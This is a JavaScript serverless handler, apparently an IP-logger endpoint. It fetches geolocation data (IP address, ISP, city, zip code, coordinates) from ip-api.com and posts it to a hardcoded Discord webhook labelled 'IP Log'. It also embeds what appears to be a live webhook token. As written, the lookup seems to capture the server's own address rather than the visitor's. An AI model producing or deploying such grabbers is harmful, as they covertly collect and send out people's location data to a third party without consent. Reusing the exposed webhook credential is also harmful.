export default async function handler(req, res) {
    const ipRes = await fetch('https://ip-api.com/json/');
    const ipData = await ipRes.json();

    const webHookUrl = "https://discord.com/api/webhooks/1362830306012303441/YEjx62A1a0Qw_k8BhIpOWhhD22yW4timN0R_lcsC-8Xz_txQ83gQqB2TjpiN_gTm3_fr";

    const countryCode = ipData.countryCode.toLowerCase();

    const params = {
        username: "IP Log",
        avatar_url: "",
        content: `__**🌐 IP Address:**__\n\`${ipData.query}\`\n\n` +
                 `__**📞 Provider:**__\n${ipData.org} (${ipData.as})\n\n` +
                 `__**🗺 Timezone:**__\n${ipData.timezone}\n\n` +
                 `__**🏳 Country and Region:**__\n${ipData.country} - ${ipData.regionName}\n\n` +
                 `__**🏙 Zip Code & City:**__\n${ipData.zip} ${ipData.city}\n\n` +
                 `__**📍 Location:**__\n**Longitude:** ${ipData.lon}\n**Latitude:** ${ipData.lat}`
    };

    await fetch(webHookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(params),
    });

    res.status(200).json({ message: "IP info sent to Discord." });
}
